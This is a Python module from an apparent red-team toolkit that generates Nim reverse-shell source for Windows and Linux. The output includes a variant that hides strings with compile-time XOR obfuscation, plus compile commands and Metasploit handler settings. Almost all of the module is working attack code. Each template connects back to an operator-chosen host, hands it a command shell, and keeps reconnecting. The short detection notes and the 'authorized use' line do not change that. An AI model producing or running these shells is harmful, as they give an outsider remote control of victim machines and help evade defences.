"""
Nim reverse shell generator.
Generates Nim source code that compiles to a Windows/Linux reverse shell binary.
Uses winim for Windows API access. For use in authorized red team exercises only.
"""
from .base import (
    RandomNamePool, ShellGenerator, ShellOptions, ShellResult, msf_handler, LISTENER_FMT, build_listener_setup,
)

_MITRE_TECHNIQUES = ["T1059", "T1027"]
_DETECTIONS = [
    "Nim-compiled binary has specific PE section layout (.bss, .data) signatures",
    "Outbound TCP from non-standard binary to unusual port",
    "Process creating socket connection without matching DNS query",
]

_NIM_UNIX_TEMPLATE = """\
import net, osproc, os, strformat

proc main() =
  let
    host = "{lhost}"
    port = Port({lport})

  while true:
    try:
      var sock = newSocket()
      sock.connect(host, port)
      while true:
        var cmd = sock.recvLine()
        if cmd == "exit": break
        let (output, _) = execCmdEx(cmd)
        sock.send(output & "$ ")
      sock.close()
    except:
      sleep(30_000)

main()
"""

_NIM_WIN_TEMPLATE = """\
import winim/lean
import net, osproc, strformat, os

proc reverseShell(host: string, port: int) =
  var
    sock = socket()
    si: STARTUPINFOA
    pi: PROCESS_INFORMATION
    sa: SECURITY_ATTRIBUTES

  sa.nLength = sizeof(SECURITY_ATTRIBUTES).DWORD
  sa.bInheritHandle = TRUE

  sock.connect(host, Port(port))
  let rawSock = sock.getFd().SOCKET

  ZeroMemory(addr si, sizeof(si))
  si.cb = sizeof(si).DWORD
  si.dwFlags = STARTF_USESTDHANDLES
  si.hStdInput = rawSock.HANDLE
  si.hStdOutput = rawSock.HANDLE
  si.hStdError = rawSock.HANDLE

  var cmd = "cmd.exe"
  CreateProcessA(
    nil, cmd[0].addr, nil, nil,
    TRUE, 0, nil, nil, addr si, addr pi
  )
  discard WaitForSingleObject(pi.hProcess, INFINITE)
  CloseHandle(pi.hProcess)
  CloseHandle(pi.hThread)
  closesocket(rawSock)

proc main() =
  while true:
    try:
      reverseShell("{lhost}", {lport})
    except:
      sleep(30_000)

main()
"""

_NIM_WIN_OBFUSCATED_TEMPLATE = """\
# Compile-time XOR string obfuscation
import winim/lean
import net, osproc, strformat, os, macros

macro encStr(s: static string): string =
  var encoded = newSeq[byte](s.len)
  const key: byte = 0x5A
  for i, c in s: encoded[i] = c.byte xor key
  result = quote do:
    block:
      var b: array[`s`.len, byte] = `encoded`
      for i in 0..<`s`.len: b[i] = b[i] xor 0x5A
      cast[cstring](unsafeAddr b[0])

const
  cHost = encStr("{lhost}")
  cCmd  = encStr("cmd.exe")

proc reverseShell(host: string, port: int) =
  var
    sock = socket()
    si: STARTUPINFOA
    pi: PROCESS_INFORMATION
    sa: SECURITY_ATTRIBUTES

  sa.nLength = sizeof(SECURITY_ATTRIBUTES).DWORD
  sa.bInheritHandle = TRUE
  sock.connect(host, Port(port))
  let rawSock = sock.getFd().SOCKET

  ZeroMemory(addr si, sizeof(si))
  si.cb = sizeof(si).DWORD
  si.dwFlags = STARTF_USESTDHANDLES
  si.hStdInput = rawSock.HANDLE
  si.hStdOutput = rawSock.HANDLE
  si.hStdError = rawSock.HANDLE

  var cmdBuf = $cCmd
  CreateProcessA(nil, cmdBuf[0].addr, nil, nil, TRUE, 0, nil, nil, addr si, addr pi)
  discard WaitForSingleObject(pi.hProcess, INFINITE)
  CloseHandle(pi.hProcess); CloseHandle(pi.hThread)
  closesocket(rawSock)

proc main() =
  while true:
    try:
      reverseShell($cHost, {lport})
    except:
      sleep(30_000)

main()
"""


class NimGenerator(ShellGenerator):
    language = "nim"

    def _generate(self, opts: ShellOptions, names: RandomNamePool | None) -> ShellResult:
        is_windows = opts.arch in ("x86", "x64") or opts.arch == "any"

        if is_windows and names:
            source = _NIM_WIN_OBFUSCATED_TEMPLATE.format(lhost=opts.lhost, lport=opts.lport)
            variant = "win_winim_obfuscated"
            compile_hint = (
                f"nim c -d:danger -d:strip --opt:speed "
                f"--passL:-static -o:shell.exe shell.nim\n"
                f"# Cross-compile from Linux:\n"
                f"nim c -d:danger -d:mingw --cpu:amd64 "
                f"-o:shell.exe shell.nim"
            )
        elif is_windows:
            source = _NIM_WIN_TEMPLATE.format(lhost=opts.lhost, lport=opts.lport)
            variant = "win_winim"
            compile_hint = (
                f"nim c -d:danger --opt:speed -o:shell.exe shell.nim\n"
                f"# Cross-compile from Linux:\n"
                f"nim c -d:danger -d:mingw --cpu:amd64 -o:shell.exe shell.nim"
            )
        else:
            source = _NIM_UNIX_TEMPLATE.format(lhost=opts.lhost, lport=opts.lport)
            variant = "unix"
            compile_hint = f"nim c -d:danger --opt:speed -o:shell shell.nim"

        command = (
            f"# Nim reverse shell — {variant}\n"
            f"# Requirements: nim, winim (nimble install winim)\n\n"
            f"# Save as shell.nim and compile:\n"
            f"# {compile_hint}\n\n"
            f"{source}"
        )

        return ShellResult(
            command=command,
            variant=variant,
            language=self.language,
            arch=opts.arch,
            listener=LISTENER_FMT.format(lport=opts.lport),
            tty_upgrade=None,
            msf_compat=msf_handler(
                "windows/x64/shell/reverse_tcp" if is_windows else "cmd/unix/reverse",
                opts.lhost, opts.lport,
            ),
            listener_setup=build_listener_setup(opts.lhost, opts.lport),
            techniques=_MITRE_TECHNIQUES,
            risk="HIGH",
            detections=_DETECTIONS,
        )
